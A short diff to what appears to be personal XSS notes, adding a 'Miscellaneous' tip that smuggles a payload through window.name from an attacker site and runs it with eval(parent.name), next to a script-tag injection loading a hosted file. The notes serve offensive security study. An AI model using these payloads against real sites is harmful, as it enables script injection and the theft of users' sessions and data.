@@ -51,3 +51,8 @@ pagetitle: XSS
 })();
 ```
 - Then, just host the file and XSS using `<script src=http://localhost/file.js></script>`
+
+**Miscellaneous**
+- If we can't use very many characters, we could use `windows.name` to include data and execute from there
+  - `windows.name` is kept 100% cross-site, so if we set it on an attacker site and then redirect the user, we can store the payload there
+  - Then, we do `<script>eval(parent.name)</script>`
